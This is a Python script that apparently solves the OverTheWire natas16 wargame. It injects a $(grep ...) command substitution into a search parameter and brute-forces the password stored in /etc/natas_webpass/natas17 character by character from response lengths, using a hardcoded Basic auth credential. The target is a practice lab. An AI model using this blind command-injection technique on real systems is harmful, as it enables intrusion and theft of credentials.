import requests

password = ""

auth = {"Authorization": "Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw=="}

wordlist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

first_half = "http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+-o+%5E"
second_half = "+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search"

wrong_character = 461983

print("Starting script...")

while True:

    for i in range(62):
        response = requests.get(first_half + password + wordlist[i] + second_half, headers=auth)
        
        if len(response.content) != wrong_character:
            password += wordlist[i]
            print("\nProgress: " + str(len(password)) + "/32 - Password now is: " + password)
            break
    
    if len(password) == 32:
        print("\n\nPassword acquired.")
        print("\nPassword is: " + password)
        break

